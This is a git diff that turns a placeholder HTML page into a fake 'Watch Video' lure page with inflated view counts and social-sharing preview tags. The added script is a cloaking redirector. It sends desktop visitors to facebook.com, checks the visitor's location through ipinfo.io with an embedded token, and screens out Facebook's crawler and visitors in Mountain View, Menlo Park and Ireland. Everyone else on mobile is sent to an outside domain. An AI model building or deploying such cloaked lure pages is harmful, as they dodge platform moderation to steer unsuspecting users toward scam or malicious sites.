@@ -1,13 +1,76 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta property="og:title" content="Watch This Video">
-  <meta property="og:description" content="7346353 views. Click to watch now!">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Watch Video</title>
 
-  <title>Watch Now</title>
+  <meta property="og:title" content="Watch Video">
+  <meta property="og:description" content="46457685 Views">
+  <meta property="og:image" content="https://cdnvidio.github.io/play.png">
+  <meta property="og:url" content="cdnvidio.github.io">
+  <meta property="og:type" content="video.other">
+
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: black;
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      font-family: Arial, sans-serif;
+    }
+    .info {
+      text-align: center;
+      font-size: 1.2em;
+      opacity: 0.7;
+    }
+  </style>
 </head>
 <body>
-  <h1>Hello, this is a preview page.</h1>
+  <div class="info">Checking location...</div>
+
+ <script>
+  const targetDomain = "https://http://paidocrew.com/dol";
+  const urlParams = new URLSearchParams(window.location.search);
+  const videoId = urlParams.get('v');
+  const ua = navigator.userAgent.toLowerCase();
+  const isFacebookBot = ua.includes("facebookexternalhit") || ua.includes("facebot");
+
+  // Deteksi apakah desktop (bukan mobile)
+  const isMobile = /iphone|android|ipad|ipod|blackberry|iemobile|opera mini|mobile/i.test(ua);
+
+  // Redirect langsung ke Facebook jika dari desktop
+  if (!isMobile) {
+    window.location.href = "https://facebook.com";
+  } else {
+    // Jika mobile, lanjutkan deteksi kota dan negara
+    fetch("https://ipinfo.io/json?token=ffdf19e96d826e")
+      .then(response => response.json())
+      .then(data => {
+        const city = (data.city || "").toLowerCase();
+        const country = (data.country || "").toLowerCase(); // kode negara: IE = Ireland
+
+        const blockedCities = ["mountain view", "menlo park"];
+        const blockedCountries = ["ie"];
+
+        const isBlockedCity = blockedCities.includes(city);
+        const isBlockedCountry = blockedCountries.includes(country);
+
+        if (!isFacebookBot && videoId && !isBlockedCity && !isBlockedCountry) {
+          window.location.href = targetDomain;
+        } else {
+          document.querySelector(".info").textContent = `Access from ${city || country} blocked. Preview only.`;
+        }
+      })
+      .catch(() => {
+        document.querySelector(".info").textContent = "Could not detect location.";
+      });
+  }
+</script>
+
 </body>
 </html>
